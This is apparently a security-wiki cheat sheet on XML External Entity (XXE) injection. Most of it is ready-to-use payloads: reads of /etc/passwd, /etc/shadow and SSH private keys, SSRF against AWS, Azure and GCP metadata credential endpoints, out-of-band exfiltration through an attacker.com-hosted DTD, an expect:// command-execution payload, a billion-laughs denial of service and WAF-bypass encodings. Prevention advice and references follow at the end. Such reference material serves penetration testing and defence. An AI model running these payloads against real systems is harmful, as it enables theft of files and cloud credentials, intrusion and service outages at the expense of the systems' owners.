---
title: XXE (XML External Entities) 
---

# XXE (XML External Entities)

**XML External Entity Injection (XXE)** is a web security vulnerability that allows attackers to interfere with an application's processing of XML data. It occurs when a weakly configured XML parser processes untrusted XML input that contains a reference to an external entity, enabling the attacker to read files on the server or interact with internal back-end systems.

XXE allows attackers to abuse XML parsers by injecting malicious external entities, leading to:

✅ **File Disclosure** (e.g., **`/etc/passwd`**, **`/proc/self/environ`**)

✅ **SSRF** (Internal API access, cloud metadata leaks)

✅ **Blind Data Exfiltration** (OOB techniques)

✅ **Denial of Service** (Billion Laughs, Quadratic Blowup)

✅ **RCE** (In rare cases via PHP **`expect://`**, XSLT)

---

## Fundamentals of XXE

### XML Components

Common XML declarations:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

- **DOCTYPE** – Defines the document type.
- **ENTITY** – Declares reusable variables.
- **SYSTEM** – Loads resources from local files or remote URLs.
- **PUBLIC** – References externally available DTDs.

### Types of XML Entities

- Internal entities
- External entities
- Parameter entities (`%entity`)
- General entities (`&entity;`)

### When XXE is Possible

Typical situations include:

- SOAP APIs
- REST APIs accepting XML
- SAML assertions
- SVG uploads
- DOCX/XLSX/PPTX parsing
- RSS/Atom feeds
- XML configuration imports
- XML-based file uploads

### Requirements

XXE generally requires:

- XML parsing enabled
- External entity resolution enabled
- DTD processing enabled (except XInclude attacks)

---

## Attack Surface

Look for XML processing in:

- SOAP services
- REST APIs supporting XML
- XML file upload functionality
- SVG uploads
- Office document uploads (DOCX, XLSX, PPTX)
- SAML authentication
- RSS/Atom import
- XML-RPC endpoints
- Mobile application APIs
- PDF generators using XML
- Configuration import/export features
- Third-party XML parsers

---

## Exploitation Techniques

### **1. Quick Check for XXE**

**Send this minimal payload** to test if XML parsing is vulnerable:

```
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe "XXE_TEST"> ]><test>&xxe;</test>
```

**If output contains `XXE_TEST` → XXE is possible!**

**For Blind One:**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://collaborator-url/">]>
<foo>&xxe;</foo>
```

If you receive interactions on the collaborator server, XXE might be there.

---

### **2. Classic File Read (Linux/Windows)**

### **Linux:**

```
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]><data>&xxe;</data>

```

### **Windows:**

```
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]><data>&xxe;</data>

```

✅ **Look for file contents in response.**

---

### **3. SSRF Test (Internal Network Probe)**

```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "<http://169.254.169.254/latest/meta-data/>">
]><foo>&xxe;</foo>
```

✅ **Check for AWS/Azure/GCP metadata leaks.**

### **4. Base64 Encoded**

```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

```

---

## **Advanced XXE Attack Vectors**

### **1. Blind XXE with Out-of-Band (OOB) Data Exfiltration**

When **no direct response** is visible, use **DNS/HTTP exfiltration**:

### **Method 1: Classic OOB via Parameter Entities**

```
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "<http://attacker.com/evil.dtd>">
  %xxe;
]><foo></foo>
```

**evil.dtd** (Hosted on attacker server):

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?leak=%file;'>">
%eval;
%exfil;

```

### **Method 2: Error-Based Exfiltration**

If HTTP exfiltration fails, force an **error message** containing data:

```
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/shadow">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>

```

*(Works if server reflects errors in responses.)*

### Method 3: **Repurposing a local DTD**

```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

```

This payload will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.

---

### **2. XXE Inside Non-XML Formats**

Many APIs accept **JSON but parse as XML** if malformed:

### **JSON → XXE Conversion Trick**

```
{
  "test": "valid JSON",
  "malicious": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
}

```

*(If the backend uses **libxml**, it may parse embedded XML!)*

### **XXE in SVG Files**

SVG is XML-based:

```
<svg xmlns="<http://www.w3.org/2000/svg>" width="100" height="100">
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <text>&xxe;</text></svg>

```

*(Upload this SVG to test for XXE.)*

---

### **3. XXE via XInclude (Bypass DTD Blocks)**

If direct DTD is blocked, use **XInclude**:

```
<foo xmlns:xi="<http://www.w3.org/2001/XInclude>"><xi:include parse="text" href="file:///etc/passwd"/></foo>

```

*(Works in **docx, xlsx, XML-based APIs**.)*

---

### **4. XXE in SOAP Requests**

SOAP APIs often parse XML:

```
<soap:Envelope xmlns:soap="<http://schemas.xmlsoap.org/soap/envelope/>"><soap:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo></soap:Body></soap:Envelope>

```

---

### **5. XXE for RCE (Rare but Possible)**

### **PHP `expect://` Wrapper**

*(Requires **`expect`** module enabled)*

```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]><foo>&xxe;</foo>

```

---

### 6. **Billion Laugh Attack**

```
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>

```

### **XSLT-Based RCE**

If XSLT processing is enabled:

```
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>"><xsl:template match="/"><xsl:value-of select="system-property('user.dir')"/></xsl:template></xsl:stylesheet>

```

---

### **7. Bypassing WAFs & Filters**

### **UTF-7 Bypass**

```
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe;+ADw-/foo+AD4-

```

### **CDATA + UTF-16 Bypass**

```
<?xml version="1.0" encoding="UTF-16BE"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

```

### **DTD in External URL with Obfuscation**

```
<!DOCTYPE foo SYSTEM "<http://attacker.com/evil.dtd>">

```

*(Some WAFs miss external DTD references.)*

---

### **8. XXE in Cloud Environments**

### **AWS Metadata SSRF**

```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "<http://169.254.169.254/latest/meta-data/iam/security-credentials/>">
]><foo>&xxe;</foo>

```

### **Azure Metadata**

```
<!ENTITY xxe SYSTEM "<http://169.254.169.254/metadata/instance?api-version=2021-02-01>">

```

### **GCP Metadata**

```
<!ENTITY xxe SYSTEM "<http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token>">

```

---

### 9. **Via Changing Content-Type**

Content-Type: From x-www-urlencoded to XML

If a POST request accepts the data in XML format, try changing the content-type to xml.

```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar

```

Send the request in XML format

```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>

```

---

## Framework-Specific Scenarios

### Java

- JAXB
- SAX
- DOM
- StAX
- XMLDecoder

Common issue:
External entities enabled by default.

---

### PHP

Common vulnerable functions:

- simplexml_load_string()
- DOMDocument::loadXML()
- XMLReader

Useful wrappers:

- php://filter
- expect://

---

### .NET

Classes:

- XmlDocument
- XmlReader
- XDocument

Older .NET versions are commonly vulnerable when DTD processing is enabled.

---

### Python

Libraries:

- lxml
- xml.etree
- minidom

Safe alternative:

- defusedxml

---

### Node.js

Libraries:

- libxmljs
- xmldom
- xml2js

---

## **Real-World Exploitation Scenarios**

### **1. Stealing SSH Keys**

```
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">

```

### **2. Reading Database Credentials**

```
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">

```

### **3. Exploiting Windows Systems**

```
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">

```

### **4. Abusing PHP Wrappers**

```
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

```

### **5. XXE in PDF Generators**

Many PDF generators (like **Apache FOP**) parse XML:

```
<!DOCTYPE foobar [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foobar>&xxe;</foobar>

```

---

### **6. XXE OOB with Apache Karaf**

CVE-2018-11788 affecting versions:

- Apache Karaf <= 4.2.1
- Apache Karaf <= 4.1.6

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "<http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com>"> %dtd;]
<features name="my-features" xmlns="<http://karaf.apache.org/xmlns/features/v1.3.0>" xmlns:xsi="<http://www.w3.org/2001/XMLSchema-instance>"
        xsi:schemaLocation="<http://karaf.apache.org/xmlns/features/v1.3.0> <http://karaf.apache.org/xmlns/features/v1.3.0>">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>

```

---

## Test Cases

| Scenario | Payload | Expected Result |
| --- | --- | --- |
| Internal Entity | `<!ENTITY test "hello">` | Response contains `hello` |
| File Read | `file:///etc/passwd` | File contents returned |
| Windows File Read | `file:///C:/Windows/win.ini` | File contents returned |
| Blind XXE | Collaborator URL | DNS/HTTP interaction |
| SSRF | Metadata endpoint | Metadata returned |
| XInclude | `<xi:include>` | File contents returned |
| External DTD | Remote DTD | Remote request observed |
| SVG Upload | XXE SVG | File disclosure/OOB |
| SOAP XXE | SOAP request | XXE triggered |
| Billion Laughs | Recursive entities | Parser DoS |
| PHP Wrapper | `php://filter` | Base64 encoded source |
| expect:// | `expect://id` | Command output (rare) |

---

## Detection Techniques

### Manual Detection

- Check Content-Type negotiation
- Try XML instead of JSON
- Inject internal entities
- Test external entities
- Test XInclude
- Upload SVG
- Test SOAP endpoints
- Monitor Collaborator
- Trigger parser errors

### Automated Detection

- Burp Suite Scanner
- Burp Collaborator
- XXEinjector
- Nuclei XXE templates
- XXE OOB Server
- OWASP ZAP

---

## Impact

Successful XXE may lead to:

- Local file disclosure
- Blind data exfiltration
- Server-Side Request Forgery (SSRF)
- Cloud credential disclosure
- Internal network scanning
- Authentication bypass (rare)
- Denial of Service
- Source code disclosure
- Configuration disclosure
- Remote Code Execution (rare)

---

## **Prevention Techniques**

- **Disable DTDs entirely** (most secure option).
- **Use JSON instead of XML** where possible.
- **Patch XML libraries** (e.g., **`libxml2 ≥ 2.9.0`**).
- **WAF Rules** to block **`<!ENTITY`** and **`SYSTEM`** keywords.
- **Input Sanitization** for XML uploads.
- Disable external entity resolution.
- Disable XInclude processing if unused.
- Disable XML Schema external references.
- Disable unnecessary XML support.
- Use secure parser configurations.
- Validate uploaded XML against schemas.
- Apply least privilege to file system access.

---

## **Tools**

| **Tool** | **Purpose** |
| --- | --- |
| **XXEinjector** | Automated OOB XXE testing |
| **Burp Collaborator** | OOB detection |
| **OOB-Server** | Self-hosted XXE listener |
| **Wfuzz** | Fuzzing XML endpoints |

---

## Good To Read

### Real CVEs

- [CVE-2017-9805 (Apache Struts)](https://nvd.nist.gov/vuln/detail/cve-2017-9805)
- [CVE-2018-11788 (Apache Karaf)](https://nvd.nist.gov/vuln/detail/cve-2018-11788)
- [CVE-2014-3660 (libxml2)](https://nvd.nist.gov/vuln/detail/cve-2014-3660)

### Hackerone Reports:

https://hackerone.com/reports/2573567

https://hackerone.com/reports/312543

https://hackerone.com/reports/836877

## **References:**

[https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

[https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)

[https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83](https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83)

[https://workbook.securityboat.net/Pentesting/Web Application/xxe/#workshoplabs](https://workbook.securityboat.net/Pentesting/Web%20Application/xxe/#workshoplabs)

[https://www.cobalt.io/blog/how-to-execute-an-xml-external-entity-injection-xxe](https://www.cobalt.io/blog/how-to-execute-an-xml-external-entity-injection-xxe)

[https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities)

[https://medium.com/@ajaikumarnadar_71386/code-review-guide-xml-external-entity-xxe-injection-part-8-be5727ca397e](https://medium.com/@ajaikumarnadar_71386/code-review-guide-xml-external-entity-xxe-injection-part-8-be5727ca397e)